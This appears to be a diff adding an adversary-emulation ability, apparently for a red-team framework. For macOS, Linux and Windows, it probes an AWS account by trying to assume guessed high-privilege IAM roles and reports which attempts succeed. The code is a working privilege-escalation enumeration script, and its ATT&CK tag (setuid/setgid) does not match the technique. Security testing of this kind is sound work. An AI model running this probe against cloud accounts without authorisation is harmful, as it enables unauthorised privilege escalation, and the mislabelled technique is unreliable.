@@ -1,0 +1,73 @@
+---
+- id: aws-priv-001
+  name: Assume Higher Privileged Roles
+  description: Attempt to assume roles with higher privileges
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.001
+    name: Setuid and Setgid
+  platforms:
+    darwin:
+      sh:
+        command: |
+          if command -v aws >/dev/null 2>&1; then
+            echo "[+] Enumerating assumable roles:"
+            # Common high-privilege role names to test
+            COMMON_ROLES="admin administrator root power-user developer ops devops security"
+            ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text 2>/dev/null)
+            if [ ! -z "$ACCOUNT_ID" ]; then
+              echo "[+] Current account: $ACCOUNT_ID"
+              for role in $COMMON_ROLES; do
+                echo "[+] Testing role: $role"
+                aws sts assume-role --role-arn "arn:aws:iam::$ACCOUNT_ID:role/$role" --role-session-name "test-session" 2>/dev/null && echo "  [+] SUCCESS: Can assume $role" || echo "  [-] FAILED: Cannot assume $role"
+                aws sts assume-role --role-arn "arn:aws:iam::$ACCOUNT_ID:role/${role}Role" --role-session-name "test-session" 2>/dev/null && echo "  [+] SUCCESS: Can assume ${role}Role" || echo "  [-] FAILED: Cannot assume ${role}Role"
+              done
+            else
+              echo "[-] Cannot determine account ID"
+            fi
+          else
+            echo "[-] AWS CLI not available"
+          fi
+    linux:
+      sh:
+        command: |
+          if command -v aws >/dev/null 2>&1; then
+            echo "[+] Enumerating assumable roles:"
+            # Common high-privilege role names to test
+            COMMON_ROLES="admin administrator root power-user developer ops devops security"
+            ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text 2>/dev/null)
+            if [ ! -z "$ACCOUNT_ID" ]; then
+              echo "[+] Current account: $ACCOUNT_ID"
+              for role in $COMMON_ROLES; do
+                echo "[+] Testing role: $role"
+                aws sts assume-role --role-arn "arn:aws:iam::$ACCOUNT_ID:role/$role" --role-session-name "test-session" 2>/dev/null && echo "  [+] SUCCESS: Can assume $role" || echo "  [-] FAILED: Cannot assume $role"
+                aws sts assume-role --role-arn "arn:aws:iam::$ACCOUNT_ID:role/${role}Role" --role-session-name "test-session" 2>/dev/null && echo "  [+] SUCCESS: Can assume ${role}Role" || echo "  [-] FAILED: Cannot assume ${role}Role"
+              done
+            else
+              echo "[-] Cannot determine account ID"
+            fi
+          else
+            echo "[-] AWS CLI not available"
+          fi
+    windows:
+      psh,pwsh:
+        command: |
+          try {
+            Write-Host "[+] Enumerating assumable roles:"
+            $commonRoles = @("admin", "administrator", "root", "power-user", "developer", "ops", "devops", "security")
+            $accountId = aws sts get-caller-identity --query Account --output text 2>$null
+            if ($accountId) {
+              Write-Host "[+] Current account: $accountId"
+              foreach ($role in $commonRoles) {
+                Write-Host "[+] Testing role: $role"
+                aws sts assume-role --role-arn "arn:aws:iam::$accountId:role/$role" --role-session-name "test-session" 2>$null | Out-Null
+                if ($LASTEXITCODE -eq 0) { Write-Host "  [+] SUCCESS: Can assume $role" } else { Write-Host "  [-] FAILED: Cannot assume $role" }
+                aws sts assume-role --role-arn "arn:aws:iam::$accountId:role/${role}Role" --role-session-name "test-session" 2>$null | Out-Null
+                if ($LASTEXITCODE -eq 0) { Write-Host "  [+] SUCCESS: Can assume ${role}Role" } else { Write-Host "  [-] FAILED: Cannot assume ${role}Role" }
+              }
+            } else {
+              Write-Host "[-] Cannot determine account ID"
+            }
+          } catch {
+            Write-Host "[-] Error testing role assumptions: $($_.Exception.Message)"
+          }
